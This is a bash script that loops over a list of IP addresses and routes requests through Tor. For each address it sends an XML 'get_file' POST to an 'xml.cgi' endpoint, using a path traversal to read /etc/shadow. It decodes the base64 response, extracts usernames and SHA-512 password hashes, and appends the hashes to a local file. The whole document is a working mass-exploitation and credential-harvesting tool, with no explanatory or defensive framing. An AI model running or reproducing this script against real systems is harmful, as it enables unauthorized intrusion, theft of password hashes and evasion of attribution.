cat "iplist" | while read line
do
echo =====test=======
timeout 5 torify curl -s -k -X POST "$line/xml.cgi" -d "xml=%3Ccmd%20action%3D%22get_file%22%20filename%3D%22../../etc/shadow%22%20offset%3D%220%22%2F%3E" 
echo ============================
echo $line
shadow=$(timeout 5 torify curl -s -k -X POST "$line/xml.cgi" -d "xml=%3Ccmd%20action%3D%22get_file%22%20filename%3D%22../../etc/shadow%22%20offset%3D%220%22%2F%3E" | grep -o -P '(?<=<b64>).*(?=</b64>)' |  base64  -d | grep '\$6\$')
users=$(echo "$shadow" | cut -d ":" -f 1)
hashes=$(echo "$shadow" | cut -d ":" -f 2)
echo -----------------------------
echo "$shadow" 
echo -----------------------------
echo "$users"
echo -----------------------------
echo "$hashes"
echo "$hashes" >> hashes
echo ============================
echo ""
done
